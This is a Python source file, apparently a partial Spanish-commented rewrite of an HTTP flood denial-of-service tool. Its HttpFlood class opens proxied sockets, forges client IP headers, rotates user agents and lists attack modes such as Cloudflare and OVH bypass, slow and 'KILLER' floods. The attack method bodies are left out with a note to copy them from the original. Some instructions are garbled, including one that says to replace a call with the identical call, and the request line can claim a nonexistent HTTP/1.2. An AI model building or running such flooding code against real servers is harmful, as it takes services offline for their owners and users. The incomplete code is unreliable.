import socket
import random
import time
from threading import Thread, Event
from typing import List, Set, Any
from urllib import parse
from contextlib import suppress

import requests
from cloudscraper import create_scraper
from yarl import URL
from PyRoxy import Proxy, ProxyTools

from .utils import Colors
from .core import Tools, REQUESTS_SENT, BYTES_SEND, SSL_CTX, search_engine_agents, tor2webs
from .config import config

class HttpFlood(Thread):
    _proxies: List[Proxy] = None
    _payload: str
    _defaultpayload: Any
    _req_type: str
    _useragents: List[str]
    _referers: List[str]
    _target: URL
    _method: str
    _rpc: int
    _synevent: Any
    SENT_FLOOD: Any

    def __init__(self,
                 thread_id: int,
                 target: URL,
                 host: str,
                 method: str = "GET",
                 rpc: int = 1,
                 synevent: Event = None,
                 useragents: Set[str] = None,
                 referers: Set[str] = None,
                 proxies: Set[Proxy] = None) -> None:
        Thread.__init__(self, daemon=True)
        self.SENT_FLOOD = None
        self._thread_id = thread_id
        self._synevent = synevent
        self._rpc = rpc
        self._method = method
        self._target = target
        self._host = host
        self._raw_target = (self._host, (self._target.port or 80))
        if not self._target.host[-1].isdigit():
            self._raw_target = (self._host, (self._target.port or 80))

        self.methods = {
            "POST": self.POST,
            "CFB": self.CFB,
            "CFBUAM": self.CFBUAM,
            "XMLRPC": self.XMLRPC,
            "BOT": self.BOT,
            "APACHE": self.APACHE,
            "BYPASS": self.BYPASS,
            "DGB": self.DGB,
            "OVH": self.OVH,
            "AVB": self.AVB,
            "STRESS": self.STRESS,
            "DYN": self.DYN,
            "SLOW": self.SLOW,
            "GSB": self.GSB,
            "RHEX": self.RHEX,
            "STOMP": self.STOMP,
            "NULL": self.NULL,
            "COOKIE": self.COOKIES,
            "TOR": self.TOR,
            "EVEN": self.EVEN,
            "DOWNLOADER": self.DOWNLOADER,
            "PPS": self.PPS,
            "KILLER": self.KILLER,
        }

        if not referers:
            referers: List[str] = [
                "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=",
                ",https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer"
                "/sharer.php?u=",
                ",https://drive.google.com/viewerng/viewer?url=",
                ",https://www.google.com/translate?u="
            ]
        self._referers = list(referers)
        if proxies:
            self._proxies = list(proxies)

        if not useragents:
            useragents: List[str] = [
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36',
                'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.120 Safari/537.36',
                # ... (puedes añadir más del original)
            ]
        self._useragents = list(useragents)
        self._req_type = self.getMethodType(method)
        self._defaultpayload = f"{self._req_type} {target.raw_path_qs} HTTP/{random.choice(['1.0', '1.1', '1.2'])}\r\n"
        self._payload = (self._defaultpayload +
                         'Accept-Encoding: gzip, deflate, br\r\n'
                         'Accept-Language: en-US,en;q=0.9\r\n'
                         'Cache-Control: max-age=0\r\n'
                         'Connection: keep-alive\r\n'
                         'Sec-Fetch-Dest: document\r\n'
                         'Sec-Fetch-Mode: navigate\r\n'
                         'Sec-Fetch-Site: none\r\n'
                         'Sec-Fetch-User: ?1\r\n'
                         'Sec-Gpc: 1\r\n'
                         'Pragma: no-cache\r\n'
                         'Upgrade-Insecure-Requests: 1\r\n')

    def select(self, name: str) -> None:
        self.SENT_FLOOD = self.GET
        for key, value in self.methods.items():
            if name == key:
                self.SENT_FLOOD = value

    def run(self) -> None:
        if self._synevent:
            self._synevent.wait()
        self.select(self._method)
        while self._synevent.is_set():
            self.SENT_FLOOD()

    @property
    def SpoofIP(self) -> str:
        spoof: str = ProxyTools.Random.rand_ipv4()
        return (f"X-Forwarded-Proto: Http\r\n"
                f"X-Forwarded-Host: {self._target.raw_host}, 1.1.1.1\r\n"
                f"Via: {spoof}\r\n"
                f"Client-IP: {spoof}\r\n"
                f'X-Forwarded-For: {spoof}\r\n'
                f'Real-IP: {spoof}\r\n')

    def generate_payload(self, other: str = None) -> bytes:
        return str.encode((self._payload +
                           f"Host: {self._target.authority}\r\n" +
                           self.randHeadercontent +
                           (other if other else "") +
                           "\r\n"))

    def open_connection(self, host=None) -> socket.socket:
        if self._proxies:
            sock = random.choice(self._proxies).open_socket(socket.AF_INET, socket.SOCK_STREAM)
        else:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
        sock.settimeout(0.9)
        sock.connect(host or self._raw_target)

        if self._target.scheme.lower() == "https":
            sock = SSL_CTX.wrap_socket(sock,
                                       server_hostname=host[0] if host else self._target.host,
                                       server_side=False,
                                       do_handshake_on_connect=True,
                                       suppress_ragged_eofs=True)
        return sock

    @property
    def randHeadercontent(self) -> str:
        return (f"User-Agent: {random.choice(self._useragents)}\r\n"
                f"Referrer: {random.choice(self._referers)}{parse.quote(self._target.human_repr())}\r\n" +
                self.SpoofIP)

    @staticmethod
    def getMethodType(method: str) -> str:
        return "GET" if {method.upper()} & {"CFB", "CFBUAM", "GET", "TOR", "COOKIE", "OVH", "EVEN",
                                            "DYN", "SLOW", "PPS", "APACHE",
                                            "BOT", "RHEX", "STOMP"} \
            else "POST" if {method.upper()} & {"POST", "XMLRPC", "STRESS"} \
            else "HEAD" if {method.upper()} & {"GSB", "HEAD"} \
            else "REQUESTS"

    # ---------- Métodos de ataque (igual que antes, con imports corregidos) ----------
    # Aquí van POST, TOR, STRESS, COOKIES, APACHE, XMLRPC, PPS, KILLER, GET, BOT, EVEN, OVH,
    # CFB, CFBUAM, AVB, DGB, DYN, DOWNLOADER, BYPASS, GSB, RHEX, STOMP, NULL, SLOW

    # Por brevedad, copia los métodos del original, asegurándote de que:
    # - usen self._suppress(Exception) en lugar de suppress(Exception)
    # - usen self.open_connection() en lugar de self.open_connection()
    # - importen time cuando sea necesario
